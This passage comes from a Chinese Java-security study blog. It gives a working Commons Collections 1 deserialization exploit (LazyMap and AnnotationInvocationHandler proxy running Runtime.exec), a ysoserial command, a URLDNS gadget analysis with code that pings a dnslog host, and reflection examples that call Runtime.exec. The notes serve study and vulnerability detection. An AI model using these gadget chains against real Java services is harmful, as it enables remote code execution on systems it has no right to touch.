href="https://aurey7.github.io/2023/04/23/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/#Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86">对象代理</a></p><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>是一个InvocationHandler。如果将这个对象用Proxy进行代理，那么在readObject的时候，只要调用任意方法，就会进入到<code>AnnotationInvocationHandler.invoke()</code>方法中，从而触发<code>LazyMap.get()</code></p><h4 id="使用LazyMap构造利用链"><a href="#使用LazyMap构造利用链" class="headerlink" title="使用LazyMap构造利用链"></a>使用LazyMap构造利用链</h4><p>直接改造一下上面的TransformedMap POC</p><ol><li><p>使用LazyMap替换TransformedMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br></code></pre></td></tr></table></figure></li><li><p>对<code>sun.reflect.annotation.AnnotationInvocationHandler</code>对象进行代理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, outerMap);<br><br><span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br></code></pre></td></tr></table></figure></li></ol><p>代理后的对象叫做proxyMap，但我们不能直接对其进行序列化，因为我们入口点是 <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>，所以我们还需要再用 AnnotationInvocationHandler对这个proxyMap进行包裹：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br></code></pre></td></tr></table></figure><h4 id="最终POC-1"><a href="#最终POC-1" class="headerlink" title="最终POC"></a>最终POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">cc1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                    &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br><br>        Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, outerMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, handler);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);<br><br><br>        <span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oss.writeObject(expMap);<br>        oss.close();<br><br>        <span class="hljs-comment">// 反序列</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bari</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bari);<br>        ois.readObject();<br>        ois.close();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在Java 8u71之后官方修改了<code>AnnotationInvocationHandler.readObject</code>，改动之后无法直接使用反序列化后的Map对象，也就无法触发Transformer利用链了。所以cc1只适用于Java 8u71之前的版本。</p>]]></content>
    
    
    <categories>
      
      <category>Java Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS</title>
    <link href="/2023/04/24/URLDNS/"/>
    <url>/2023/04/24/URLDNS/</url>
    
    <content type="html"><![CDATA[<p>分析一下URLDNS的触发过程</p><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><p>在2015年11月6日FoxGlove Security安全团队的<code>@breenmachine</code> 发布了一篇长博客里，借用Java反序列化和Apache Commons Collections这一基础类库实现远程命令执行的真实案例来到人们的视野，各大Java Web Server纷纷躺枪。</p><p>ysoserial就是两位原作者再议题中释放出的一个工具，它可以让用户选择利用链，生成反序列化利用数据，将这个数据发送给目标，从而执行用户预先定义的命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java -jar ysoserial-all.jar CommonsCollections1 <span class="hljs-string">&quot;id&quot;</span><br></code></pre></td></tr></table></figure><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>URLDNS是ysoserial中的一个利用链，作用在于发起一次DNS请求，常用于检测反序列化漏洞。</p><p><strong>优点</strong></p><ol><li>使用Java内置类构造，没有第三方库的依赖</li><li>无需回显，可以通过DNS请求得知是否存在反序列化漏洞</li></ol><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>ysoserial会调用<code>URLDNS</code>类的<code>getObject</code>方法，返回一个对象，这个对象就是最后被序列化的对象，这里是<code>HashMap</code></p><p>ysoserial也在注释中给出了利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">*   Gadget Chain:<br>*     HashMap.readObject()<br>*       HashMap.putVal()<br>*         HashMap.hash()<br>*           URL.hashCode()<br></code></pre></td></tr></table></figure><p>触发反序列化的方法就是<code>HashMap</code>类的<code>readObject</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span><br>    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <br>    ...<br>        <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>            putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里调用了<code>hash</code>函数计算HashMap的键名hash</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><p>继续跟进<code>hash</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br><span class="hljs-type">int</span> h;<br><span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果key不是null就会调用<code>hashCode</code>方法，这里的key是一个<code>java.net.URL</code>对象，继续跟进其<code>hashCode</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> hashCode;<br><br>hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br><span class="hljs-keyword">return</span> hashCode;<br>&#125;<br></code></pre></td></tr></table></figure><p>hashCode 等于 -1 时，还会继续调用<code>handler.hashCode</code>，此时，<code>handler</code>时<code>URLStreamHandler</code>对象，继续跟进其<code>hashCode</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Generate the protocol part.</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>    <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>        h += protocol.hashCode();<br><br>    <span class="hljs-comment">// Generate the host part.</span><br>    <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>这里会调用<code>getHostAddress()</code>，继续根据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (hostAddress != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> hostAddress;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (host == <span class="hljs-literal">null</span> || host.isEmpty()) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        hostAddress = InetAddress.getByName(host);<br>    &#125; <span class="hljs-keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> hostAddress;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的<code>InetAddress.getByName(host)</code>的作用是根据主机名，获取其IP地址，在网络上进行一次DNS查询。</p><p>这就达到了这个利用链的目的</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>知道了原理，我们自己写一个代码触发一下这个利用链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://9rct5n.dnslog.cn&quot;</span>);<br><br>        expMap.put(url, <span class="hljs-number">123</span>); <span class="hljs-comment">// 此时hashcode值不为-1 无法触发DNS查询</span><br><br>        <span class="hljs-comment">//通过反射修改hashCode值</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(url, -<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>只要将url对象的hashCode设置为-1，就会按照利用链触发DNS查询。</p>]]></content>
    
    
    <categories>
      
      <category>Java Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全基础</title>
    <link href="/2023/04/23/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/04/23/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>最近开始学习Java安全，稍微总结一下</p><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>Java反射是Java非常重要的动态特征，通过使用反射我们可以获取任何类的成员方法、成员变量、构造方法等，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p><h3 id="反射获取Runtime对象执行代码"><a href="#反射获取Runtime对象执行代码" class="headerlink" title="反射获取Runtime对象执行代码"></a>反射获取Runtime对象执行代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取Runtime类对象</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">runtimeClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><br><span class="hljs-comment">// 获取构造方法</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> runtimeClass1.getDeclaredConstructor();<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br><br><span class="hljs-comment">// 获取Runtime的exec(String cmd)方法</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeMethod</span> <span class="hljs-operator">=</span> runtimeClass1.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><br><span class="hljs-comment">// 调用exec方法，等价于 rt.exec(cmd);</span><br>runtimeMethod.invoke(runtimeInstance, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>运行输出：laptop-rserru3g\aurey</p><p>效果相当于：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h3><p>Java反射操作的是 <code>java.lang.Class</code> 对象，所以我们需要先获取到Class对象</p><p>通常我们有如下击中方式获取一个类的Class对象</p><ol><li><code>ClassName.class</code> </li><li><code>Class.forName(&quot;java.lang.Runtime&quot;)</code></li><li><code>classLoader.loadClass(&quot;java.lang.Runtime&quot;)</code></li></ol><p><strong>获取Runtime类Class对象：</strong></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Class class1 = java.lang.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span><span class="hljs-keyword">class</span>;<br>Class class2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>;<br>Class class3 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>get<span class="hljs-constructor">SystemClassLoader()</span>.load<span class="hljs-constructor">Class(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>;<br></code></pre></td></tr></table></figure><p>通过以上任意一种方式就可以获取 <code>java.lang.Runtime</code> 类的Class对象。</p><p>反射调用内部类的时候需要使用 <code>$</code> 来代替 <code>.</code></p><p>例如<code>ysoserial.test</code>类中有一个叫<code>ref</code>的内部类，那么调用的时候就应该将类名写成<code>ysoserial.test$ref</code></p><h4 id="forName"><a href="#forName" class="headerlink" title="forName"></a>forName</h4><p>forName有两个函数重载：</p><ol><li><code>Class&lt;?&gt; forName(String name)</code></li><li><code>Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader)</code></li></ol><p>第一个是最常用的反射获取class的方法，可以理解为第二种方式的一个封装：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-params">className</span>)</span>;<br><span class="hljs-comment">// 等价于</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-params">className</span>, <span class="hljs-params">true</span>, <span class="hljs-params">currentLoader</span>)</span>;<br></code></pre></td></tr></table></figure><p><code>forName</code>的第一个参数是想获取的类名，第二个参数表示是否初始化，第三个参数是ClassLoader</p><p>第二个参数<code>initialize</code>，是告诉Java虚拟机是否执行类初始化</p><p>如果该选项为true，<code>forName</code>会自动执行类初始化，并执行<code>static&#123;&#125;</code>代码块中的内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InitTest</span> &#123;<br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;Empty block initial&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Static block initial&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InitTest</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Initial function&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ref</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;ysoserial.test.InitTest&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行输出：Static block initial</p><h3 id="反射创建类实例"><a href="#反射创建类实例" class="headerlink" title="反射创建类实例"></a>反射创建类实例</h3><p>在Java中，任何一个类都必须有一个或多个构造方法，如果代码中没有创建构造方法，那么在类编译的时候会自动创建一个无参构造方法</p><p><strong>java.lang.Runtime类构造方法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span>&#123;<br><span class="hljs-comment">/** Don&#x27;t let anyone else instantiate this class */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Runtime</span><span class="hljs-params">()</span> &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Runtime</code> 类的构造方法是私有的，我们不能通过 <code>Runtime rt = new Runtime();</code>来创建Runtime对象。但我们可以借助反射机制，通过修改方法访问权限从而间接创建Runtime对象。</p><h4 id="修改权限访问构造方法"><a href="#修改权限访问构造方法" class="headerlink" title="修改权限访问构造方法"></a>修改权限访问构造方法</h4><p>也就是上面代码中的这一段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取构造方法</span><br><span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> runtimeClass1.getDeclaredConstructor();<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 创建Runtime类示例，等价于 Runtime rt = new Runtime();</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br></code></pre></td></tr></table></figure><p><code>getConstructor()</code> 和 <code>getDeclaredConstructor()</code>都可以获取到类的构造方法，区别在于后者无法获取到私有方法，所以一般在获取某个类的构造方法的时候我们会使用<code>getDeclaredConstructor()</code>去获取构造方法。</p><p>如果构造方法有一个或多个参数的情况下我们应该在获取构造方法的时候传入对应的参数类型数组：</p><p><code>clazz.getDeclaredConstructor(String.class, String.class)</code></p><p>获取到构造方法以后我们可以通过<code>constructor.newInstance()</code>来创建类实例，如果有参数的情况下也需要传入对应的参数值。当我们没有访问构造方法的权限时我们应该调用<code>constructor.setAccessible(true)</code>修改访问权限，才能创建类实例。</p><h4 id="通过现有函数获取类对象"><a href="#通过现有函数获取类对象" class="headerlink" title="通过现有函数获取类对象"></a>通过现有函数获取类对象</h4><p>为什么类的构造方法会被设置成私有的呢？难道不想让用户使用这个类吗？</p><p>这里涉及到常见的设计模式：”单例模式”</p><blockquote><p>下面引用p神 Java安全漫谈-02中的例子</p></blockquote><p>比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建一个连接，此时作为开发者就可以将数据库连接使用的类的构造函数设置为私有的，然后编写一个静态方法来获取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainDB</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">TrainDB</span> <span 